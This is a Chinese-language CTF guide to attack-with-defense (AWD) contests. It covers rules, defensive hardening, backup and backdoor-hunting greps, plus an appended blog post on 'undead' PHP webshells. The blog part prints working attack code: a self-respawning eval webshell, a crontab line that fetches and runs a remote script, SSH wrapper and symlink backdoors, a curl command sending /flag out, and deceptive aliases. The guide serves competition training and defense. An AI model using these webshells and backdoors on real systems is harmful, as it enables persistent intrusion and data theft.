![img](./source/imgs/AWD%E6%80%9D%E8%B7%AF/1731212771541-094e1a5a-2a9f-4efe-8898-171fe3d29e14.png)

「 **攻防模式 | AWD (Attack With Defense)** 」 是 CTF 比赛 「**CTF Capture The Flag**」 几种主要的比赛模式之一，该模式常见于线下赛，在该模式中，每个队伍都拥有一个相同的初始环境 ( 我们称其为 GameBox )，该环境通常运行着一些特定的服务或应用程序，而这些服务通常包含一些安全漏洞。参赛队伍需要挖掘利用对方队伍服务中的安全漏洞，获取 Flag 以获得积分 ; 同时，参赛队伍也需要修补自身服务漏洞进行防御，以防被其他队伍攻击和获取 Flag。

### 类别[¶](https://hello-ctf.com/HC_AWD/awd_about/#_2)

根据题目漏洞点或者方向可分为 Web-AWD 和 PWN-AWD，考察内容和对应方向类似。

#### Web-AWD[¶](https://hello-ctf.com/HC_AWD/awd_about/#web-awd)

- **目标**: Web 应用或服务的服务器。
- **常见挑战**: SQL 注入、XSS（跨站脚本攻击）、CSRF（跨站请求伪造）、文件上传漏洞等 **OWASP(Open Web Application Security Project)**」 漏洞。
- **防守策略**: 高危代码修补，规则过滤，输入输出过滤，基础 WAF 编写（非通防）等。
- **技能要求**: 需要良好的 Web 安全基础。

#### PWN-AWD[¶](https://hello-ctf.com/HC_AWD/awd_about/#pwn-awd)

- **目标**: 底层漏洞利用，例如缓冲区溢出、整数溢出等。
- **常见挑战**: Stack Buffer Overflow、Heap Overflow、Format String Bugs 等。
- **防守策略**: 使用各种内存保护机制（如 ASLR、NX、Canary）和补丁。
- **技能要求**: 深入了解操作系统、C/C++ 编程，以及逆向工程。

### 特点[¶](https://hello-ctf.com/HC_AWD/awd_about/#_3)

该模式通常具备以下特点 :

- **实时性强**: 攻防模式可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负。
- **全面性**: 该模式不仅测试参赛队伍的攻击能力，还测试他们的防御和团队协作能力。
- **高度动态**: 参赛队伍可能需要不断地更新和调整防御策略，以应对不断变化的攻击环境。

### 元素[¶](https://hello-ctf.com/HC_AWD/awd_about/#_4)

该模式通常包含以下元素 :

**目标标志（Flag）**: 类似密码或特殊字符串，存储在服务中，需要被取出以获得积分。

**积分板（Scoreboard）**: 显示各队伍的积分，通常实时更新。

**漏洞利用（Exploit）**: 队伍开发或使用已有的攻击代码，以攻击对手。

**修补（Patch）**: 当找到漏洞后，队伍需要尽快修补自己的系统，防止被攻击。

**日志和监控（Log and Monitor）**: 为了更好地进行防御和攻击，队伍通常需要设置日志和监控系统。

### 规则[¶](https://hello-ctf.com/HC_AWD/awd_about/#_5)

该模式通常采用 **「 零和积分方式（Zero-Sum Scoring）」** 即 一个队伍从另一个队伍那里获得积分（通常是通过成功的攻击和获取标志）时，被攻击的队伍将失去相应的积分。

通常情况下 :

- 每个队伍会被给定一个初始分数 ( 根据比赛时间 难度等多维度预估 )。
- 通常以 5/10 分钟为一个回合，每回合刷新 Flag 值或者重置 Flag 提交冷却时间。
- 每回合内，一个队伍的一个服务被渗透攻击成功（被拿 Flag 并提交），则扣除一定分数，攻击成功的队伍获得相应分数。
- 每回合内，如果队伍能够维持自己的服务正常运行，则分数不会减少；
- 如果一个服务宕机或异常无法通过测试，则会扣分。在不同规则下，扣除的分数处理不同，在一些规则下为仅扣除，一些则为正常的队伍加上平均分配的分数。
- 在某些情况下，环境因自身或者其他原因导致服务永久损坏或丢失，无法恢复，需要申请环境重置。根据比赛规则的不同，一些主办方会提供重置服务，但需要扣除对应分数 ; 也有可能主办方不提供重置服务，则每轮扣除环境异常分。

### 环境[¶](https://hello-ctf.com/HC_AWD/awd_about/#_6)

根据物理环境的不同，即 线上 AWD 和 线下 AWD ，参赛队伍可能会有不同的配置需求，该差异主办方会提前下发材料说明。无论线下还是线上，该模式的环境都具有以下共同特点。

- 环境由 选手终端，GameBox，FlagServer 三部分组成
- 选手终端在线上可采取 VPN 接入，Web 映射转发接入等多种接入方式；选手终端在线下则需要自行配网（通常主办方会给出配网引导文件）方式可能为 WIFI 接入或者 使用网线和标准的 RJ45 接口进行连接。
- GameBox 通常位于同一个 D 段中，主办方通常会提供 ip 资产列表，其中 IP 通常与队伍序号或者 ID 对应。
- GameBox 一般使用 ssh 进行登录管理，登录方式为密码或者私钥。
- FlagServer 提供类似 Flag 提交的相关服务。

### 建立信息网络[¶](https://hello-ctf.com/HC_AWD/awd_web.exp/#_1)

《孙子兵法 · 谋攻》：「知彼知己，百战不殆。」

**组件发现**：

```plain
find / -name "nginx.conf"                 #定位nginx目录
find / -path "*nginx*" -name nginx*conf   #定位nginx配置目录
find / -name "httpd.conf"                 #定位apache目录
find / -path "*apache*" -name apache*conf #定位apache配置目录
```

**网站发现**：

通常都位于 /var/www/html 中，如果没有试试 find 命令

```plain
find / -name "index.php"   #定位网站目录
```

**日志发现**：

对日志的实时捕捉，除了能有效提升防御以外，还能捕捉攻击流量，得到一些自己不清楚的攻击手段，平衡攻击方和防守方的信息差。

```plain
/var/log/nginx/        #默认Nginx日志目录
/var/log/apache/       #默认Apache日志目录
/var/log/apache2/      #默认Apache日志目录
/usr/local/tomcat/logs #Tomcat日志目录
tail -f xxx.log        #实时刷新滚动日志文件
```

以上是定位常见文件目录的命令或方法，比赛需要根据实际情况类推，善用 find 命令！

**文件监控**

文件监控能及时木马文件后门生成 , 及时删除防止丢分。

**其他命令**：

```plain
netstat -ano/-a    #查看端口情况
uname -a           #系统信息
ps -aux ps -ef     #进程信息
cat /etc/passwd    #用户情况
ls /home/          #用户情况
id                 #用于显示用户ID，以及所属群组ID
find / -type d -perm -002      #可写目录检查
grep -r “flag” /var/www/html/  #查找默认FLAG
```

### 口令更改[¶](https://hello-ctf.com/HC_AWD/awd_web.exp/#_2)

这里需要更改的口令包括但不限于服务器 SSH 口令、数据库口令，WEB 服务口令以及 WEB 应用后台口令。

```plain
passwd username    #ssh口令修改
set password for mycms@localhost = password('123'); #MySQL密码修改
find /var/www//html -path '*config*’                #查找配置文件中的密码凭证
```

### 建立备份[¶](https://hello-ctf.com/HC_AWD/awd_web.exp/#_3)

除了攻击成功可以让对手扣分，还能破坏对方环境使其宕机被 check 扣分；同时己方也有可能在修复过程中存在一些误操作，导致源码出错，致使服务停止；对页面快速恢复时，及时备份是必要的，因此页面备份至关重要。

**压缩文件**：

要注意的是 有的题目环境可能不支持 zip

```plain
tar -cvf web.tar /var/www/html
zip -q -r web.zip /var/www/html
```

**解压文件**：

```plain
tar -xvf web.tar -c /var/www/html
unzip web.zip -d /var/www/html
```

**备份到服务器**：

```plain
mv web.tar /tmp
mv web.zip /home/xxx
```

**上传下载文件**：

```plain
scp username@servername:/path/filename /tmp/local_destination  #从服务器下载单个文件到本地
scp /path/local_filename username@servername:/path             #从本地上传单个文件到服务器
scp -r username@servername:remote_dir/ /tmp/local_dir          #从服务器下载整个目录到本地
scp -r /tmp/local_dir username@servername:remote_dir           #从本地上传整个目录到服务器
```

**备份指定数据库**：

数据库配置信息一般可以通过如 config.php/web.conf 等文件获取。

```plain
mysqldump –u username –p password databasename > bak.sql
```

**备份所有数据库**：

```plain
mysqldump –all -databases > bak.sql
```

**导入数据库**：

```plain
mysql –u username –p password database < bak.sql
```

### 代码审计[¶](https://hello-ctf.com/HC_AWD/awd_web.exp/#_4)

将备份下载下来后，立即在本地开展审计工作，确定攻击手段和防御策略，要注意因为 awd 时间短，且代码量多所以考核的题目应该也不会太难，通常不会涉及到太难的代码审计。

- D 盾：查杀后门
- seay 源代码审计：审计代码

**一般 AWD 模式中存在的后门：**

- 官方后门 / 预置后门

```plain
# 可以使用下面的代码进行查找
find /var/www/html -name "*.php" |xargs egrep 'assert|eval|phpinfo\(\)|\(base64_decoolcode|shell_exec|passthru|file_put_contents\(\.\*\$|base64_decode\('
```

- 常规漏洞 如 SQL 注入 文件上传 代码执行 序列化及反序列化 ...
- 选手后门（选手后期传入的木马）

### 漏洞修复[¶](https://hello-ctf.com/HC_AWD/awd_web.exp/#_5)

在代码审计结束后，及时对自身漏洞进行修补，要注意的是漏洞修复遵循保证服务不长时间宕机的原则, 应当多使用安全过滤函数，能修复尽量修复 , 不能修复先注释或删除相关代码，但需保证页面显示正常。

### 应急响应[¶](https://hello-ctf.com/HC_AWD/awd_web.exp/#_6)

通过命令查看可疑文件：

```plain
find /var/www/html -name *.php -mmin -20                         #查看最近20分钟修改文件
find ./ -name '*.php' | xargs wc -l | sort -u                    #寻找行数最短文件
grep -r --include=*.php  '[^a-z]eval($_POST'  /var/www/html      #查包含关键字的php文件
find /var/www/html -type f -name "*.php" | xargs grep "eval(" |more
```

**不死马查杀**：

杀进程后重启服务，写一个同名的文件夹和写一个 sleep 时间低于别人的马 (或者写一个脚本不断删除别人的马)

比如写个马来一直杀死不死马进程：

```plain
<?php system("kill -9 pid;rm -rf .shell.php"); ?>  #pid和不死马名称根据实际情况定
```

**后门用户查杀**：

UID 大于 500 的都是非系统账号，500 以下的都为系统保留的账号，使用 `userdel -r username` 完全删除账户

**其他查杀**：

部分后门过于隐蔽，可以使用 `ls -al` 命令查看所有文件及文件修改时间和内容进行综合判断，进行删除。`可以写脚本定时清理上传目录、定时任务和临时目录等`

**进程查杀**

```plain
ps -aux  #查看进程
kill -9 pid #强制进程查杀
```

**关闭端口**

```plain
netstat -anp  #查看端口
firewall-cmd --zone= public --remove-port=80/tcp –permanent #关闭端口
firewall-cmd –reload #重载防火墙
```

# AWD新手的不死马及权限维持思路

 [2021-05-29](https://blog.polowong.top/2021/05/29/AWD不死马/) 848  [Comments](https://blog.polowong.top/2021/05/29/AWD不死马/#comments) Word Count: 1.1k(words) Read Count: 5(minutes)

参考链接
https://jlkl.github.io/2019/02/08/Web_13/
[https://rmb122.com/2019/04/04/%E5%B9%B2%E6%8E%89-PHP-%E4%B8%8D%E6%AD%BB%E9%A9%AC/](https://rmb122.com/2019/04/04/干掉-PHP-不死马/)
https://www.cnblogs.com/Cl0ud/p/13620537.html
https://zhuanlan.zhihu.com/p/88850561

# 概念

不死马指的是入到内存的webshell，在PHP中可以使用ulink删除自身文件并循环创建webshell。

# 不死马利用流程

首先根据web后门或者任何挖掘出来的漏洞尝试执行系统命令（如遗留的web后门等），通过该类漏洞成功执行写入不死马的系统命令并执行该不死马。比如通过内置的后门直接system(“echo 不死马脚本内容 >/var/www/html;php 不死马文件名.php”)。这样就会在该目录下不断生成一个不死马 比如.3.php。通过webshell管理工具或者使用Python写脚本批量访问去getflag。

# 不死马

这里偷个别的师傅的图先
不死马一般长这样

```
<?php    ignore_user_abort(true);//设置与客户机断开是否会终止脚本的执行，这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。    set_time_limit(0);    unlink(__FILE__);    $file = '.3.php';    $code = '<?php if(md5($_GET["pass"])=="1a1dc91c907325c69271ddf0c944bc72"){@eval($_POST[a]);} ?>';    //pass=pass    while (1){        file_put_contents($file,$code);        //system('touch -m -d "2018-12-01 09:10:12" .3.php');        usleep(0);    } ?>
```

该不死马不断生成.3.php，通过访问http://localhost/.3.php?pass=pass  然后POST a=system(“想要执行的系统命令”);即可通过不死马实现命令执行。这里使用MD5是因为防止别人骑着自己的马进去了，MD5理论上不可逆。如果使用python批量getshell的话大体思路就是

url=http://localhost/.3.php?pass=pass
data={“a”:”system("cat /flag");”}
flag=requests.post(url=url,data=data).text然后url变变就可以，一般会维护一个地址池 从地址池里面取url或者取特征（可能某个url字段不一样）直接打就行，再配合提交flag的api就可以实现自动getflag。

# 不死马删除

这里不死马删除有几个思路

如果在蚁剑里面删不死码 可能编码有问题，使用如下命令解决

sed -i ‘s/\r$//‘ 1.sh

1.shell脚本直接删除不死马

```
while : do rm -rf .3.php; echo "remove success"; done
```

这里其实可以更完善一些，比如挂上while自动检测新增的文件 或者配合文件监控脚本实现新增之后直接调用函数删除新增的文件等等（Python实现，我不会shell）
2.PHP服务重启（awd环境可能不允许，因为权限较低）
service apache2 restart
service php restart

3.杀低权限PHP进程
php-apache:

```
<?php system("kill `ps -ef | grep httpd | grep -v grep | awk '{print $2}'`");
```

php-fpm:

```
<?php system("kill `ps -ef | grep php-fpm | grep -v grep | awk '{print $2}'`");
```

# awd权限维持

AWD的权限维持其实和普通的权限维持差不多常用的大概有 crontab ssh软连接 sshwrapper。
详情参考https://xz.aliyun.com/t/7338细看了下这篇文章 发现了一个隐藏一句话的方法。

```
echo -e "<?=\`\$_POST[cmd]\`?>\r<?='System default page.';?>" >default.php
```

crontab添加计划任务自动写不死马

```
* * * * * curl http://host/sh.sh >/tmp/.tmp/1.sh;chmod u+x /tmp/.tmp/1.sh ; /tmp/.tmp/1.sh
```

本地起一个http服务 放上一个sh.sh脚本，里面写了创建php不死马的命令。
下面两种暂时利用失败 可能是腾讯云的原因。

```
ssh wrapper cd /usr/sbin/ mv sshd ../bin/ echo '#!/usr/bin/perl' >sshd echo 'exec "/bin/sh" if(getpeername(STDIN) =~ /^..4A/);' >>sshd echo 'exec{"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,' >>sshd chmod u+x sshd /etc/init.d/sshd restart exp: socat STDIO TCP4:target_ip:22,sourceport=13377 ssh软连接 ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555; 建立一个软连接，然后通过5555端口访问ssh服务
```

还有一种操作就是curl外带本地命令执行结果,这个也可以写到crontab里面，比较方便的使用提交flag的api提交flag。示例如下

curl “http://:7777?flag=$(cat /flag)”

# 一些小技巧

用来迷惑对手

```
alias crontab="echo no crontab for `whoami` ||" alias cat="echo `date`|md5sum|cut -d ' ' -f1||"
```

- **Article Link**

https://polosec.github.io/2021/05/29/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC/

- **Copyright Notice:** All articles in this blog, unless otherwise stated, are under the[CC BY 4.0 CN agreement](http://creativecommons.org/licenses/by/4.0/deed.zh).Reprint please indicate the source!